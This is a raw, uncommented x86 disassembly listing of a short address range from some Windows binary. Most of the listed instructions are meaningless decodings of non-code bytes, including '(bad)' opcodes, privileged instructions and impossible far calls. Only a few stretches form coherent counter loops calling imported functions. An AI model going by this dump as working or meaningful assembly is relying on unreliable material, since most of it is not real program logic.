  407b28:	icebp  
  407b29:	dec    ebx
  407b2a:	bound  eax,QWORD PTR [ebx+0x732ea13b]
  407b30:	dec    ebp
  407b31:	ss jbe 0x407b3d
  407b34:	repz mov bh,0x7d
  407b37:	iret   
  407b38:	or     DWORD PTR [ecx],esi
  407b3a:	dec    ecx
  407b3b:	mov    bh,0x7a
  407b3d:	push   0x278e534d
  407b42:	push   edx
  407b43:	popa   
  407b44:	sbb    al,0xac
  407b46:	mov    al,ds:0x34369e22
  407b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b4c:	adc    ah,BYTE PTR [edx-0x7796ea7b]
  407b52:	mov    ch,dl
  407b54:	ror    dh,0x6c
  407b57:	js     0x407bc6
  407b59:	jne    0x407b33
  407b5b:	mov    cl,0x20
  407b5d:	pusha  
  407b5e:	or     al,0xb4
  407b60:	or     dl,BYTE PTR [ebx-0x3308990]
  407b66:	(bad)  
  407b67:	and    esi,DWORD PTR [eax+0x31]
  407b6a:	fisubr WORD PTR [ebx-0x6b]
  407b6d:	dec    esp
  407b6e:	push   eax
  407b6f:	add    ebx,DWORD PTR [esi+0x1a]
  407b72:	xchg   BYTE PTR [esi],bh
  407b74:	mov    ?,WORD PTR [edi+0x5da6596a]
  407b7a:	dec    eax
  407b7b:	ficomp DWORD PTR [edx]
  407b7d:	mov    al,ds:0xe300a8bb
  407b82:	jb     0x407b25
  407b84:	stos   BYTE PTR es:[edi],al
  407b85:	push   es
  407b86:	cli    
  407b87:	add    eax,0x47c0c013
  407b8c:	dec    ecx
  407b8d:	inc    eax
  407b8e:	sti    
  407b8f:	cdq    
  407b90:	cli    
  407b91:	es imul ebx,edx,0xe3463977
  407b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b99:	imul   DWORD PTR [eax-0x12cd7422]
  407b9f:	and    DWORD PTR ds:0xe5c03fee,ebx
  407ba5:	hlt    
  407ba6:	stos   DWORD PTR es:[edi],eax
  407ba7:	imul   ebp,DWORD PTR [esi+0x51500249],0x3130d0e
  407bb1:	out    0x25,al
  407bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb4:	inc    esi
  407bb5:	mov    eax,ds:0x6c9f2512
  407bba:	sub    eax,0xfb7efb31
  407bbf:	imul   edi,edx,0x138be89a
  407bc5:	popa   
  407bc6:	mov    edx,0xd4713097
  407bcb:	cmp    ah,BYTE PTR [edi-0x7d]
  407bce:	xchg   ebx,eax
  407bcf:	xor    ch,dh
  407bd1:	call   0xb2c87020
  407bd6:	or     bh,bh
  407bd8:	mov    ah,0xc6
  407bda:	enter  0xd777,0x8c
  407bde:	fisub  WORD PTR [edi]
  407be0:	adc    BYTE PTR [edx-0x159ed846],dl
  407be6:	mov    BYTE PTR [eax-0x7830adcc],dh
  407bec:	ret    
  407bed:	inc    esp
  407bee:	iret   
  407bef:	loope  0x407c54
  407bf1:	push   ebp
  407bf2:	push   es
  407bf3:	xchg   edx,eax
  407bf4:	dec    esi
  407bf5:	fmul   DWORD PTR ds:0x777e0c49
  407bfb:	jge    0x407ba3
  407bfd:	or     ebp,eax
  407bff:	loop   0x407c4f
  407c01:	push   ss
  407c02:	fwait
  407c03:	out    0xcd,eax
  407c05:	xchg   edi,eax
  407c06:	test   al,0x82
  407c08:	xor    DWORD PTR [eax+ecx*1],0x38
  407c0c:	mov    edx,0xf5eabd69
  407c11:	jg     0x407c58
  407c13:	jb     0x407be1
  407c15:	loop   0x407c0f
  407c17:	xor    eax,0x7a2eeb38
  407c1c:	in     eax,0xfa
  407c1e:	arpl   si,di
  407c20:	(bad)  
  407c21:	ja     0x407bf8
  407c23:	push   cs
  407c24:	jmp    0xdb94fd41
  407c29:	or     esp,ebp
  407c2b:	pop    eax
  407c2c:	dec    eax
  407c2d:	call   0x88feac80
  407c32:	nop
  407c33:	mov    edx,0x36df7375
  407c38:	mov    ds:0x2a9c49b9,eax
  407c3d:	xchg   ebx,eax
  407c3e:	fdiv   DWORD PTR ds:0x9412b87a
  407c44:	(bad)  
  407c45:	dec    esi
  407c46:	push   ss
  407c47:	popa   
  407c48:	xchg   ebp,eax
  407c49:	adc    DWORD PTR [eax],esi
  407c4b:	ds dec esi
  407c4d:	in     al,0xe2
  407c4f:	adc    DWORD PTR [edx],esp
  407c51:	mov    BYTE PTR [eax],ah
  407c53:	xor    DWORD PTR [ecx+0x33280974],esi
  407c59:	das    
  407c5a:	out    dx,eax
  407c5b:	shr    edi,1
  407c5d:	(bad)  
  407c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c5f:	xchg   esi,eax
  407c60:	aas    
  407c61:	add    eax,0x36ac523c
  407c66:	test   DWORD PTR [ecx+ecx*2+0x25],esi
  407c6a:	dec    esi
  407c6b:	jle    0x407bfb
  407c6d:	or     cl,bh
  407c6f:	lea    esi,[eax]
  407c71:	and    DWORD PTR [edx+ecx*1+0x7a],0x193ad975
  407c79:	xchg   ecx,eax
  407c7a:	dec    edi
  407c7b:	fisub  WORD PTR ds:0x3d95959f
  407c81:	repz iret 
  407c83:	lods   al,BYTE PTR ds:[esi]
  407c84:	adc    eax,edx
  407c86:	pushf  
  407c87:	es test eax,0xa7d9c364
  407c8d:	add    DWORD PTR [ecx+0x3170bc4],ebp
  407c93:	dec    ecx
  407c94:	fist   WORD PTR [ebx+0x31ca9853]
  407c9a:	cmp    eax,0x1952d918
  407c9f:	in     eax,dx
  407ca0:	mov    ss,edx
  407ca2:	xchg   edi,eax
  407ca3:	lock leave 
  407ca5:	sar    BYTE PTR [eax+0x1f],cl
  407ca8:	call   0x4419855
  407cad:	add    ebx,eax
  407caf:	aas    
  407cb0:	sub    BYTE PTR [ebx],al
  407cb2:	sub    edx,edi
  407cb4:	add    BYTE PTR [ebx+0x68],0x96
  407cb8:	adc    DWORD PTR [ebp-0x1a192730],ebp
  407cbe:	xchg   ebx,eax
  407cc0:	inc    esi
  407cc1:	cld    
  407cc2:	cmp    ecx,DWORD PTR [edx-0x17]
  407cc5:	js     0x407ce9
  407cc7:	mov    dl,0x1e
  407cc9:	xchg   ebx,eax
  407cca:	lahf   
  407ccb:	(bad)  
  407ccc:	mov    al,ds:0x985f695b
  407cd1:	ficomp DWORD PTR [esi]
  407cd3:	iret   
  407cd4:	jno    0x407c92
  407cd6:	mov    edx,0x63cc507d
  407cdb:	add    al,0xe2
  407cdd:	pop    ss
  407cde:	fcomp  QWORD PTR [ebp+eax*2+0x8]
  407ce2:	ret    
  407ce3:	hlt    
  407ce4:	add    esp,DWORD PTR [esi+0x39]
  407ce7:	ror    esi,0x5b
  407cea:	push   ss
  407ceb:	and    BYTE PTR [edi+0x23],dh
  407cee:	dec    edi
  407cef:	lds    esi,FWORD PTR [ecx]
  407cf1:	inc    edx
  407cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cf3:	add    al,0x25
  407cf5:	pop    esi
  407cf6:	xchg   ebp,eax
  407cf7:	sbb    BYTE PTR [edx+0xd],0xde
  407cfb:	fcom   QWORD PTR [edi-0xa]
  407cfe:	push   0x3a8a6e6d
  407d03:	and    eax,0x5e08f061
  407d08:	enter  0x20a5,0x7a
  407d0c:	int    0x1e
  407d0e:	(bad)  
  407d0f:	ins    BYTE PTR es:[edi],dx
  407d10:	push   esi
  407d11:	mov    esp,0xbc2fe44d
  407d16:	push   cs
  407d17:	or     eax,0xc445c7b4
  407d1c:	test   DWORD PTR ds:[eax+edi*8+0x438e05c7],ebx
  407d24:	inc    ebx
  407d25:	add    BYTE PTR [edx],bl
  407d27:	add    BYTE PTR [eax],al
  407d29:	add    BYTE PTR [ebx+0x43438e3d],al
  407d2f:	add    BYTE PTR [eax],al
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43438e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4329ce
  407d4c:	cmp    DWORD PTR ds:0x43438e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43438e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43438e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43438e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43438e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432dce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43439a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [edi],al
  407da2:	push   esi
  407da3:	push   ss
  407da4:	enter  0xca4d,0x70
  407da8:	jo     0x407e13
  407daa:	jg     0x407e1c
  407dac:	jo     0x407d69
  407dae:	push   esp
  407daf:	outs   dx,DWORD PTR ds:[esi]
  407db0:	and    eax,edi
  407db2:	and    bh,BYTE PTR [ebp-0x1f]
  407db5:	test   al,0x5a
  407db7:	and    edx,edx
  407db9:	pop    ebp
  407dba:	call   0xe577:0x9d59a014
  407dc1:	cwde   
  407dc2:	sub    ebp,DWORD PTR [ecx]
  407dc4:	je     0x407dc2
  407dc6:	(bad)  
  407dc7:	and    cl,bh
  407dc9:	inc    eax
  407dca:	fs jb  0x407d9d
  407dcd:	fwait
  407dce:	mov    WORD PTR [ebx+ebx*2+0x56],fs
  407dd2:	push   esp
  407dd3:	aad    0xe4
  407dd5:	adc    edi,DWORD PTR [edx+0x509d58e6]
  407ddb:	or     BYTE PTR [edx+0x5b],0xa1
  407ddf:	jne    0x407e35
  407de1:	pop    ecx
  407de2:	ss hlt 
  407de4:	scas   eax,DWORD PTR es:[edi]
  407de5:	shl    DWORD PTR [ebx],cl
  407de7:	inc    edx
  407de8:	sti    
  407de9:	fwait
  407dea:	or     eax,0x52221f78
  407def:	test   eax,0xdf74262d
  407df4:	push   ecx
  407df5:	or     BYTE PTR [ebx],dh
  407df7:	adc    esi,DWORD PTR [edx-0x6c]
  407dfa:	rcl    DWORD PTR [edx-0x708dd654],cl
  407e00:	and    al,0xa3
  407e02:	xchg   esp,eax
  407e03:	or     al,BYTE PTR [eax-0xb9610b6]
  407e09:	ss std 
  407e0b:	and    ecx,DWORD PTR [ecx]
  407e0d:	scas   al,BYTE PTR es:[edi]
  407e0e:	jp     0x407da0
  407e10:	in     eax,dx
  407e11:	(bad)
  407e14:	fsub   QWORD PTR [ebx]
  407e16:	fnstsw WORD PTR [edi+0x257332ab]
  407e1c:	(bad)  
  407e1e:	fcom   DWORD PTR ds:0xeb2babad
  407e24:	dec    ebp
  407e25:	jo     0x407e35
  407e27:	cmp    BYTE PTR [eax+edi*1-0x77],cl
  407e2b:	jecxz  0x407e67
  407e2d:	dec    esi
  407e2e:	or     edx,ebp
  407e30:	lock xchg ebp,eax
  407e32:	pop    edx
  407e33:	fisub  WORD PTR [edx-0x2c]
  407e36:	sti    
  407e37:	pushf  
  407e38:	xchg   ebp,eax
  407e39:	jae    0x407e37
  407e3b:	imul   edx,DWORD PTR [ebp+0x43fceaa9],0x7e
  407e42:	out    dx,al
  407e43:	pop    ebp
  407e44:	xchg   ebp,eax
  407e45:	popf   
  407e46:	adc    al,0x67
  407e48:	and    BYTE PTR [eax+edx*1-0x6f],cl
  407e4c:	ficomp DWORD PTR [eax]
  407e4e:	inc    ebx
  407e4f:	xor    cl,BYTE PTR [edx]
  407e51:	xchg   esp,eax
  407e52:	aad    0x61
  407e54:	push   ds
  407e55:	sbb    dh,dl
  407e57:	mov    dh,0xd9
  407e59:	popa   
  407e5a:	xchg   edi,eax
  407e5b:	test   DWORD PTR [ebx+edx*1-0x57],edx
  407e5f:	cmp    DWORD PTR [eax-0x4e],ecx
  407e62:	add    ah,cl
  407e64:	js     0x407e3b
  407e66:	addr16 mov ds:0x54ee,eax
  407e6a:	jnp    0x407e86
  407e6c:	adc    ebp,DWORD PTR [eax]
  407e6e:	pop    ebp
  407e6f:	xchg   ebx,eax
  407e70:	cmp    esp,DWORD PTR [edx+0x35270326]
  407e76:	mov    ecx,0xa3fdb65e
  407e7b:	mov    bl,0xea
  407e7d:	dec    edi
  407e7e:	pusha  
  407e7f:	jno    0x407ef7
  407e81:	push   es
  407e82:	ret    0xa8e3
  407e85:	daa    
  407e86:	sbb    ebp,DWORD PTR [ebx+0x77]
  407e89:	or     al,0x61
  407e8b:	out    dx,al
  407e8c:	push   esp
  407e8d:	out    dx,al
  407e8e:	ror    BYTE PTR [edx],1
  407e90:	add    eax,ebx
  407e92:	lahf   
  407e93:	push   0x2bc057ab
  407e98:	call   0xf678d8fa
  407e9d:	(bad)  
  407e9e:	xor    dl,BYTE PTR [eax+0x6833968]
  407ea4:	jno    0x407eed
  407ea6:	jge    0x407e58
  407ea8:	into   
  407ea9:	int    0x24
  407eab:	cmp    edx,DWORD PTR [eax-0x15]
  407eae:	cmp    eax,0x855950d6
  407eb3:	fsub   DWORD PTR [ebx]
  407eb5:	xchg   esi,eax
  407eb6:	lock cmc 
  407eb8:	psubusw mm2,QWORD PTR ds:0x8935c2a8
  407ebf:	mov    ds:0xedb48e9c,al
  407ec4:	lods   al,BYTE PTR ds:[esi]
  407ec5:	sbb    eax,0x5db3acb3
  407eca:	test   al,0xe9
  407ecc:	push   ds
  407ecd:	and    ch,BYTE PTR [esi+0x37a35179]
  407ed3:	push   ebx
  407ed4:	jl     0x407eba
  407ed6:	cld    
  407ed7:	add    DWORD PTR [eax+0x2288baab],ebx
  407edd:	stos   DWORD PTR es:[edi],eax
  407ede:	imul   eax,DWORD PTR [edx+0x3e],0x31
  407ee2:	clc    
  407ee3:	aad    0xc8
  407ee5:	pop    ss
  407ee6:	(bad)  
  407ee7:	xlat   BYTE PTR ds:[ebx]
  407ee8:	mov    DWORD PTR [esi-0x3d],eax
  407eeb:	mov    edx,DWORD PTR [edi+0x21177fed]
  407ef1:	cdq    
  407ef2:	outs   dx,DWORD PTR ds:[esi]
  407ef3:	sbb    al,0x71
  407ef5:	or     esp,DWORD PTR ds:0x2517f13e
  407efb:	mov    WORD PTR [edx],gs
  407efd:	jb     0x407f48
  407eff:	or     eax,0x99ce2247
  407f04:	xor    ebx,esi
  407f06:	mov    esi,DWORD PTR [ebx-0x61cb1d11]
  407f0c:	imul   DWORD PTR [edi]
  407f0e:	jg     0x407edb
  407f10:	icebp  
  407f11:	(bad)  
  407f12:	cli    
  407f13:	dec    edi
  407f14:	and    al,0xf2
  407f16:	push   edi
  407f17:	mov    al,BYTE PTR [edi]
  407f19:	repnz pop edi
  407f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f1c:	xlat   BYTE PTR ds:[ebx]
  407f1d:	push   ss
  407f1e:	imul   esp,eax,0x4a
  407f21:	mov    bl,0x3
  407f23:	scas   eax,DWORD PTR es:[edi]
  407f24:	dec    edi
  407f25:	and    DWORD PTR [edi+0x26],ebp
  407f28:	ja     0x407f1d
  407f2a:	stos   DWORD PTR es:[edi],eax
  407f2b:	mov    esp,esi
  407f2d:	or     ch,ch
  407f2f:	and    al,0xcc
  407f31:	in     al,0xd0
  407f33:	ss jb  0x407fae
  407f36:	aam    0xf4
  407f38:	push   ss
  407f39:	jle    0x407f8d
  407f3b:	add    al,0x76
  407f3d:	lods   al,BYTE PTR ds:[esi]
  407f3e:	loopne 0x407f90
  407f40:	jp     0x407ee0
  407f42:	in     eax,0x64
  407f44:	pop    ss
  407f45:	and    esi,DWORD PTR [edi]
  407f47:	loopne 0x407ef9
  407f49:	cmp    al,ch
  407f4b:	test   eax,0x60bdfb00
  407f50:	call   0xf64:0x97727511
  407f57:	repnz sbb al,al
  407f5a:	stos   DWORD PTR es:[edi],eax
  407f5b:	cwde   
  407f5c:	push   ebx
  407f5d:	mov    ds:0xe167ae25,eax
  407f62:	inc    esi
  407f63:	out    0xff,al
  407f65:	out    dx,al
  407f66:	inc    eax
  407f67:	rcl    ebp,0x2a
  407f6a:	std    
  407f6b:	enter  0xd9f0,0x90
  407f6f:	jl     0x407f3f
  407f71:	xlat   BYTE PTR ds:[ebx]
  407f72:	cs push 0x47
  407f75:	fild   WORD PTR [edx+0x1bcd0c53]
  407f7b:	mov    fs,esp
  407f7d:	pop    esi
  407f7e:	ss sbb al,0xb8
  407f81:	mov    al,ds:0x6e3be663
  407f86:	add    eax,DWORD PTR [ebx]
  407f88:	data16 jmp 0x407fe6
  407f8b:	adc    al,0x11
  407f8d:	push   ds
  407f8e:	push   esp
  407f8f:	adc    al,0x5f
  407f91:	dec    edx
  407f92:	pop    edi
  407f93:	jns    0x407f49
  407f95:	sbb    al,al
  407f97:	sub    edx,DWORD PTR [esi+0x60fdadfc]
  407f9d:	xchg   ebx,eax
  407f9e:	(bad)  
  407f9f:	mov    ecx,0xc0163109
  407fa4:	je     0x409cf3
  407faa:	push   ebx
  407fab:	mov    DWORD PTR ds:0x43437a,0x643a
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432708,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43438a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43438a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43438a,edi
  407fe5:	cmp    DWORD PTR ds:0x43438a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43438a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432c3e
  40800a:	cmp    DWORD PTR ds:0x43438a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43438a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43438a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43439e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	test   al,0x4f
  408045:	popf   
  408046:	outs   dx,BYTE PTR ds:[esi]
  408047:	inc    esi
  408048:	enter  0x7070,0x69
  40804c:	jg     0x4080be
  40804e:	jo     0x408037
  408050:	ins    DWORD PTR es:[edi],dx
  408051:	sbb    al,0xdd
  408053:	jecxz  0x40800a
  408055:	xchg   esi,eax
  408056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408057:	ret    0xd8a9
  40805a:	mov    bh,0x72
  40805c:	and    cl,al
  40805e:	jbe    0x408028
  408060:	mov    WORD PTR [ecx],ds
  408062:	pushf  
  408063:	pushf  
  408064:	mov    DWORD PTR [eax-0x72],edi
  408067:	outs   dx,DWORD PTR ds:[esi]
  408068:	inc    eax
  408069:	or     eax,0x4ec225f6
  40806e:	xchg   edx,eax
  40806f:	bound  ecx,QWORD PTR [ecx]
  408071:	mov    edx,0x137a7f1a
  408076:	xor    dh,ch
  408078:	adc    BYTE PTR [ecx],0x4f
  40807b:	push   cs
  40807c:	aad    0x3
  40807e:	sub    eax,0xdcb044e5
  408083:	in     eax,dx
  408084:	jp     0x408054
  408086:	jle    0x4080db
  408088:	push   0x74
  40808a:	adc    DWORD PTR [ebp-0x2a796611],eax
  408090:	cs cmp eax,0x703143af
  408096:	mov    ds,WORD PTR es:[edi]
  408099:	test   BYTE PTR [esi+0x67f626f0],0xd0
  4080a0:	mov    ecx,0x8fb06329
  4080a5:	inc    edi
  4080a6:	cmp    eax,0x23acb4d5
  4080ab:	pop    ss
  4080ac:	inc    ebx
  4080ad:	rcr    BYTE PTR [eax+ebx*1+0x15ee2a18],0xb0
  4080b5:	arpl   WORD PTR [eax+0x10],dx
  4080b8:	mov    esi,0x1b0cc3fc
  4080bd:	loopne 0x408040
  4080bf:	or     DWORD PTR [ecx],edx
  4080c1:	xchg   ebx,eax
  4080c2:	lock aaa 
  4080c4:	cmc    
  4080c5:	cmp    eax,0x457d7ac
  4080ca:	inc    eax
  4080cb:	adc    DWORD PTR [ebx-0x154b7c56],ebp
  4080d1:	imul   edx,DWORD PTR [esi-0x12],0x7610e8e3
  4080d8:	(bad)  
  4080d9:	adc    DWORD PTR [ecx],eax
  4080db:	push   es
  4080dc:	fwait
  4080dd:	aam    0x28
  4080df:	add    BYTE PTR [esi+0x4ce5068],cl
  4080e5:	and    eax,0x4e94cc91
  4080ea:	lods   al,BYTE PTR ds:[esi]
  4080eb:	out    dx,eax
  4080ec:	popf   
  4080ed:	mov    edx,0x3fe65cc
  4080f2:	les    ebx,FWORD PTR [eax+0x3f7997d1]
  4080f8:	pop    ds
  4080f9:	les    edx,FWORD PTR [ebp+0x7c]
  4080fc:	lods   eax,DWORD PTR ds:[si]
  4080fe:	jne    0x408103
  408100:	jmp    0x408157
  408102:	ins    BYTE PTR es:[edi],dx
  408103:	jmp    0x4080e9
  408105:	mul    BYTE PTR [esi]
  408107:	mov    edx,0x48191a82
  40810c:	or     DWORD PTR [eax+0x17],ecx
  40810f:	add    DWORD PTR [eax-0x1e2fd55b],ebp
  408115:	(bad)  
  408116:	dec    ecx
  408117:	(bad)  
  408118:	adc    eax,0x6a71a216
  40811d:	mov    ah,0x63
  40811f:	cs or  eax,ebp
  408122:	dec    edx
  408123:	aam    0x61
  408125:	mov    cl,0x4c
  408127:	pop    edi
  408128:	mov    ebx,DWORD PTR [edi+0x47de682e]
  40812e:	xor    DWORD PTR [edx+edi*1],esp
  408131:	push   ebp
  408132:	xlat   BYTE PTR ds:[ebx]
  408133:	(bad)  
  408135:	cli    
  408136:	pusha  
  408137:	cmp    edx,edx
  408139:	fs mov dh,bl
  40813c:	xchg   ecx,eax
  40813d:	add    BYTE PTR [esi],dl
  40813f:	pop    edi
  408140:	rcl    DWORD PTR [ecx],1
  408142:	imul   ecx,DWORD PTR [ebp-0x6421a4c9],0x3537eb26
  40814c:	frstor [ecx+eiz*4+0x41]
  408150:	dec    ebx
  408151:	gs push esp
  408153:	in     eax,0x81
  408155:	jecxz  0x408145
  408157:	aam    0xeb
  408159:	out    dx,al
  40815a:	cli    
  40815b:	add    eax,0xafb86d90
  408160:	or     ebp,DWORD PTR [edx-0x7f]
  408163:	push   ecx
  408164:	pop    esp
  408165:	call   0x50f4:0xc4bb6ab2
  40816c:	ret    0xc4d0
  40816f:	mov    dh,BYTE PTR [edx-0x4]
  408172:	add    BYTE PTR [edx+0x2e55ab9f],bl
  408178:	pop    ecx
  408179:	sbb    BYTE PTR [edi-0x2e4a2719],ch
  40817f:	aas    
  408180:	xor    ebp,DWORD PTR [edx+0x6207b6a1]
  408186:	xchg   DWORD PTR [ebx-0x2b],esp
  408189:	leave  
  40818a:	nop
  40818b:	clc    
  40818c:	adc    al,0xf0
  40818e:	pop    ecx
  40818f:	je     0x40813b
  408191:	adc    esp,DWORD PTR [edx-0x5415f7e9]
  408197:	and    esi,DWORD PTR [ebp+0x15]
  40819a:	push   0x41f1ab0a
  40819f:	int3   
  4081a0:	mov    al,ds:0x1f72641a
  4081a5:	idiv   DWORD PTR [esi+0x53]
  4081a8:	mov    ebp,0x8b8e7b09
  4081ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081ae:	push   eax
  4081af:	mov    dh,0x18
  4081b1:	pop    edx
  4081b2:	sti    
  4081b3:	and    esi,DWORD PTR [edx]
  4081b5:	clc    
  4081b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081b7:	and    edx,eax
  4081b9:	mov    al,ds:0xa9d7018a
  4081be:	xor    dh,ch
  4081c0:	jecxz  0x408208
  4081c2:	xchg   esi,eax
  4081c3:	aaa    
  4081c4:	cld    
  4081c5:	loope  0x408173
  4081c7:	xchg   esp,eax
  4081c8:	push   ds
  4081c9:	adc    ch,BYTE PTR [ebx+0x304afcd8]
  4081cf:	xchg   DWORD PTR [esi+0xe281390],ebx
  4081d5:	fstp   TBYTE PTR [edi]
  4081d7:	adc    al,0xb5
  4081d9:	push   edx
  4081da:	xor    eax,0x75796e42
  4081df:	scas   eax,DWORD PTR es:[edi]
  4081e0:	popa   
  4081e1:	sbb    BYTE PTR [esi+eiz*8+0xb],0x1f
  4081e6:	jae    0x4081e3
  4081e8:	enter  0xad03,0x5
  4081ec:	call   0x84377ac
  4081f1:	and    BYTE PTR [eax],ah
  4081f3:	or     dl,BYTE PTR [ebx]
  4081f5:	cmc    
  4081f6:	or     dh,BYTE PTR [edi]
  4081f8:	ja     0x4081a3
  4081fa:	inc    ebp
  4081fb:	out    0x8c,al
  4081fd:	inc    ebx
  4081fe:	or     DWORD PTR [edi+0x61],0x6c
  408202:	push   ecx
  408203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408204:	push   esp
  408205:	jmp    0x8c6a:0xf63a56a6
  40820c:	or     eax,0x83ab406b
  408211:	push   esp
  408212:	mov    bl,0x5f
  408214:	outs   dx,DWORD PTR ds:[esi]
  408215:	dec    ebx
  408216:	mov    WORD PTR [ecx-0x588007b],gs
  40821c:	jae    0x4081a3
  40821e:	retf   0xefe3
  408221:	jo     0x4081e8
  408223:	jbe    0x4081f5
  408225:	pop    ecx
  408226:	jbe    0x4081da
  408228:	fcompp 
  40822a:	(bad)  
  40822b:	ins    DWORD PTR es:[edi],dx
  40822c:	pop    eax
  40822d:	dec    eax
  40822e:	lock mov ds:0x48e7ddfc,eax
  408234:	arpl   si,ax
  408236:	stos   DWORD PTR es:[edi],eax
  408237:	fs popf 
  408239:	shr    BYTE PTR ds:0xe61e4984,0x5
  408240:	and    BYTE PTR [ebp+eiz*4-0x33],dl
  408244:	xchg   ecx,eax
  408245:	cwde   
  408246:	sub    edi,edx
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432de2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434372,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434386,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	and    eax,0xbfd3659b
  408285:	(bad)  
  408286:	jo     0x4082f8
  408288:	imul   edi,DWORD PTR [edi+0x70],0xf3256570
  40828f:	or     al,0xf3
  408291:	adc    BYTE PTR [ecx-0x53],ah
  408294:	lods   eax,DWORD PTR ds:[esi]
  408295:	xchg   ecx,eax
  408296:	jl     0x408222
  408298:	adc    eax,0x3765b57a
  40829d:	or     al,0x1c
  40829f:	mov    edi,0xec334201
  4082a4:	sbb    eax,0xf536e0af
  4082a9:	xchg   esp,eax
  4082aa:	cmp    al,0x56
  4082ac:	addr16 pop ebx
  4082ae:	outs   dx,BYTE PTR ds:[esi]
  4082af:	es (bad) 
  4082b1:	adc    edx,eax
  4082b3:	jbe    0x40823f
  4082b5:	cmp    ecx,DWORD PTR [eax]
  4082b7:	adc    BYTE PTR [esi],ch
  4082b9:	push   edx
  4082ba:	(bad)  
  4082bd:	inc    eax
  4082bf:	jle    0x4082d1
  4082c1:	loopne 0x40833c
  4082c3:	mov    WORD PTR [eax+0x76e206a8],ss
  4082c9:	push   ss
  4082ca:	ret    
  4082cb:	shr    BYTE PTR [ebx],cl
  4082cd:	sbb    eax,0xf72a7832
  4082d2:	out    0xc4,eax
  4082d4:	aas    
  4082d5:	jp     0x40827b
  4082d7:	dec    edi
  4082d8:	and    DWORD PTR [ebx+0xa],0xffffffbd
  4082dc:	jae    0x4082ce
  4082de:	int3   
  4082df:	gs mov ch,0x18
  4082e2:	loopne 0x40834e
  4082e4:	or     BYTE PTR [esi-0x346eefa9],cl
  4082ea:	xor    BYTE PTR [edx+eiz*4-0x5a],dl
  4082ee:	fcmovnu st,st(1)
  4082f0:	pop    esi
  4082f1:	pop    esi
  4082f2:	xchg   BYTE PTR [edi],bh
  4082f4:	inc    esp
  4082f5:	cs ds push ebx
  4082f8:	(bad)  
  4082f9:	xadd   bl,ch
  4082fc:	sub    al,0x7d
  4082fe:	outs   dx,DWORD PTR ds:[esi]
  4082ff:	dec    edi
  408300:	aad    0x91
  408302:	ins    BYTE PTR es:[edi],dx
  408303:	int3   
  408304:	test   al,0xdc
  408306:	cmp    eax,0xbab8fa5e
  40830b:	sub    DWORD PTR [esi],esp
  40830d:	xchg   edi,eax
  40830e:	test   BYTE PTR [edx-0x2614dc42],cl
  408314:	dec    edi
  408315:	add    al,0x17
  408317:	cmc    
  408318:	inc    ebx
  408319:	and    ecx,edx
  40831b:	aas    
  40831c:	into   
  40831d:	inc    esp
  40831e:	or     esi,DWORD PTR [ebp+0x21]
  408321:	and    ebx,DWORD PTR [edi+0x30]
  408324:	fbstp  TBYTE PTR [ebp-0x6e20868c]
  40832a:	dec    edi
  40832b:	je     0x40831f
  40832d:	push   0x1890eb1f
  408332:	adc    al,0xc6
  408334:	stc    
  408335:	lods   al,BYTE PTR ds:[esi]
  408336:	int3   
  408337:	mul    dl
  408339:	dec    esp
  40833a:	enter  0x9230,0x2d
  40833e:	in     al,dx
  40833f:	push   ebx
  408340:	jecxz  0x40839c
  408342:	sbb    eax,0x7b8af51
